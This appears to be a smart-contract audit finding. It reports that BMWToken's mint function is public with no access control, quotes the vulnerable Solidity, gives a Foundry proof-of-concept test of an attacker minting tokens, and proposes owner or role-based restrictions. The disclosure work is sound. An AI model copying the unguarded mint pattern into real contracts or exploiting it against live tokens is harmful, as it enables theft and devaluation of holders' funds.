[H-01] Unrestricted ```mint``` Function in ``BMWToken`` Allows Unlimited Token Creation


Summary

The mint function in BMWToken is public, enabling any user to mint arbitrary amounts of tokens to any address. This critical vulnerability allows attackers to inflate the token supply, devalue existing tokens, and potentially exploit other contracts in the ecosystem, leading to significant financial loss.

Vulnerability Details

The ``mint`` function in ```BMWToken.sol``` is defined as public without access control, allowing unrestricted calls:

```js
function mint(address to, uint256 amount) public {
    _mint(to, amount);
}
```

The ``_mint`` function, inherited from OpenZeppelin ERC20, increases the total supply and credits amount tokens to the to addres. No checks restrict who can call ``mint`` or limit the `amount`.

Root Cause: The `public` visibility and absence of access control modifiers (e.g. `onlyOwner`) enable unauthorized minting. 

Impact

.Token Devaluation: Unlimited minting can flood the market with tokens, reducing their value and harming legitimate holders.

.Economic Attacks: Attackers could mint tokens to manipulate DeFi protocols (e.g., liquidity pools, staking contracts) that use BMWToken, draining funds or skewing rewards.

.Loss of Trust: The ability to arbitrarily increase the supply undermines the token’s credibility, potentially collapsing the protocol ecosystem.

.Severity: High, due to direct financial loss and systemic disruption.

Proof of Concept (PoC)

The following Foundry test demonstrates the vulnerability:

```js
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import "../BMWToken.sol";

contract BMWTokenTest is Test {
    BMWToken token;
    address attacker = address(0xdead);

    function setUp() public {
        token = new BMWToken(address(this));
    }

    function testUnrestrictedMint() public {
        uint256 initialSupply = token.totalSupply();
        vm.prank(attacker);
        token.mint(attacker, 1e18); // Mint 1 token
        uint256 newSupply = token.totalSupply();
        assertEq(newSupply, initialSupply + 1e18, "Supply should increase");
        assertEq(token.balanceOf(attacker), 1e18, "Attacker should have tokens");
    }
}
```

Execution: Run `forge test --match-path test/BMWTokenTest.sol`. The test shows an attacker minting tokens, increasing the supply without authorization.

Recommended Mitigation

Restrict the mint function to the contract owner using OpenZeppelin’s Ownable:
```js
function mint(address to, uint256 amount) public onlyOwner {
    _mint(to, amount);
}
```

Alternatively, use AccessControl for role-based minting if multiple addresses need permission:

```js
import "@openzeppelin/contracts/access/AccessControl.sol";
contract BMWToken is ERC20, Ownable, ERC20Permit, AccessControl {
    bytes32 public constant MINTER_ROLE = keccak256("MINTER_ROLE");
    constructor(address initialOwner) {
        _setupRole(MINTER_ROLE, initialOwner);
    }
    function mint(address to, uint256 amount) public onlyRole(MINTER_ROLE) {
        _mint(to, amount);
    }
}
```

References

OpenZeppelin ERC20
OpenZeppelin Ownable



